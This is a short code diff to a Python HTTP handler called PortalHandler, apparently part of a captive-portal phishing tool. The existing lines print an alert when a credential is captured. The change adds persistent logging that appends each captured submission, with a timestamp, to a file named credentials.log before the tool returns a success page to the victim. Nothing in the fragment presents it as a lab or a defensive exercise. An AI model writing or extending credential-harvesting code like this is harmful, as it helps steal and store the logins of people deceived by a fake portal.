@@ -116,6 +116,11 @@ class PortalHandler(http.server.BaseHTTPRequestHandler):
         console.print(f"\n[bold red]🚩 ALERT: Credential Captured![/]")
         console.print(f"[yellow]Data sent: {post_data}[/]\n")
         
+        # Persistent Logging
+        with open("credentials.log", "a") as f:
+            from datetime import datetime
+            f.write(f"[{datetime.now()}] {post_data}\n")
+        
         # Success page
         self.send_response(200)
         self.send_header("Content-type", "text/html")
